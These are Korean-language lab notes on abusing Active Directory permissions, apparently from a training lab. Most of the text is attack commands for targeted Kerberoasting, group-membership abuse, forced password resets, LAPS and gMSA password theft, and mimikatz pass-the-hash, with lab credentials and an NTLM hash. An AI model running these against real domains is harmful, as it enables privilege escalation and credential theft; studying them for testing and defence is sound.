## Targeted Kerberoasting
- 쓰기 권한을 악용해 원래 SPN이 없던 계정에 SPN을 강제로 부여한 뒤, TGS 티켓을 요청해 해시를 탈취하고 오프라인으로 크래킹하는 기법.
- GenericAll, GenericWrite, WriteProperty, WriteSPN, Validated-SPN

### Enumerating
```bash
python3 examples/dacledit.py -principal pedro -target Rita -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

$userSID = (Get-DomainUser -Identity pedro).objectsid

Get-DomainObjectAcl -Identity rita | ?{$_.SecurityIdentifier -eq $userSID}
```

### Abusing
- SPN을 생성한 후에 TGS를 요청하게 되는 코드가 있다.
```bash
python3 targetedKerberoast.py -vv -d inlanefreight.local -u pedro -p SecuringAD01 --request-user rita --dc-ip 10.129.205.81
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

Set-DomainObject -Identity rita -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose

$User = Get-DomainUser Rita

$User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash

Set-DomainObject -Identity Rita -Clear serviceprincipalname -Verbose
```

## Add Members
- GenericAll, GenericWrite, Self, AllExtendedRights, Self-Membership

### Enumerating
```bash
python3 examples/dacledit.py -principal pedro -target 'Backup Operators' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

$userSID = (Get-DomainUser -Identity pedro).objectsid

Get-DomainObjectAcl -Identity 'Backup Operators' -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
```

### Abusing
```bash
bloodyAD -d inlanefreight.local -u pedro -p SecuringAD01 --dc-ip 10.129.205.81 add groupMember 'Backup Operators' pedro

net rpc group members 'Backup Operators' -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```
```powershell
Import-module .\powerview.ps1

Add-DomainGroupMember -Identity "Backup Operators" -Members pedro -Verbose
```

## Password Abuse
### ForceChangePassword
- GenericAll, AllExtendedRights, User-Force-Change-Password

#### Enueration
```bash
python3 examples/dacledit.py -principal pedro -target yolanda -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

$userSID = (Get-DomainUser -Identity pedro).objectsid

Get-DomainObjectAcl -Identity yolanda | ?{$_.SecurityIdentifier -eq $userSID}

Get-DomainObjectAcl -Identity yolanda -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
```

#### Abusing
```bash
net rpc password yolanda Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```
```
rpcclient -U INLANEFREIGHT/pedro%SecuringAD01 10.129.205.81

rpcclient $> setuserinfo2 yolanda 23 Mynewpassword2
```
```powershell
import-module .\powerview.ps1

Set-DomainUserPassword -Identity yolanda -AccountPassword $((ConvertTo-SecureString 'NewpasswordfromW1' -AsPlainText -Force)) -Verbose
```
```powershell
Import-Module ActiveDirectory

Set-ADAccountPassword yolanda -NewPassword $((ConvertTo-SecureString 'NewpasswordfromW2' -AsPlainText -Force)) -Reset -Verbose
```

### ReadLAPSPassword
- GenericAll
- AllExtendedRights
- ReadProperty
- ms-Mcs-AdmPwd

#### Enumerating
```bash
python3 examples/dacledit.py -principal 'LAPS READERS' -target 'laps09$' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
```powershell
import-module .\powerview.ps1

$group = Get-DomainGroup -Identity "LAPS Readers"

Get-DomainObjectAcl -Identity LAPS09 -ResolveGUIDs  |?{$_.SecurityIdentifier -eq $group.objectsid}
```

#### Abusing
```powershell
Import-Module .\PowerView.ps1

Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name

Get-DomainComputer -Properties name | ForEach-Object {
    $computer = $_.name
    $obj = Get-DomainObject -Identity $computer -Properties "ms-mcs-AdmPwd",name -ErrorAction SilentlyContinue
    if($obj.'ms-mcs-AdmPwd'){
        Write-Output "$computer`: $($obj.'ms-mcs-AdmPwd')"
    }
}
```
```powershell
Import-Module ActiveDirectory

Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
```
```bash
python3 laps.py -u rita -p Password123 -l 10.129.205.81 -d inlanefreight.local
```

### ReadGMSAPassword
- https://github.com/rvazarkar/GMSAPasswordReader
```bash
python3 gMSADumper.py -d inlanefreight.local -l 10.129.205.81 -u pedro -p SecuringAD01
```
```powershell
.\GMSAPasswordReader.exe --accountname apache-dev
```
```
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe" exit

mimikatz(commandline) # privilege::debug

mimikatz(commandline) # sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe
```
